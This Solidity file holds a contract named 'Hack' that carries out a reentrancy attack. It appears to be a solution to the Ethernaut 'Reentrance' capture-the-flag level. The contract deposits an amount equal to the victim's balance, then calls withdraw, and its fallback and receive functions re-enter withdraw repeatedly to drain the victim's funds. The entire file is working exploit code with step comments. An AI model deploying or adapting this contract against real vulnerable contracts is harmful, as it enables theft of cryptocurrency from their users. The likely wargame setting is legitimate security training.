// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract Hack {
    address victim;
    uint256 balance;
    IReentrance victimContract;


    constructor(address _victim){
        victim = _victim;
        victimContract = IReentrance(_victim);
    }

    function donate() public payable {
        //0. get the balance
        balance = victim.balance;

        //1. donate the balance
        victimContract.donate{value:balance}(address(this));
    }

    function getBalance() public view returns (uint256){
        return victimContract.balanceOf(address(this));
    }

    function attack() public payable {
        //2. call withdraw
        victimContract.withdraw(balance);
    }

    fallback() external payable { 
        //3. call withdraw again (reenter)
        IReentrance(victim).withdraw(balance);
        
    }

    receive() external payable {
        //3. call withdraw again (reenter)
        
        IReentrance(victim).withdraw(balance);
     }



}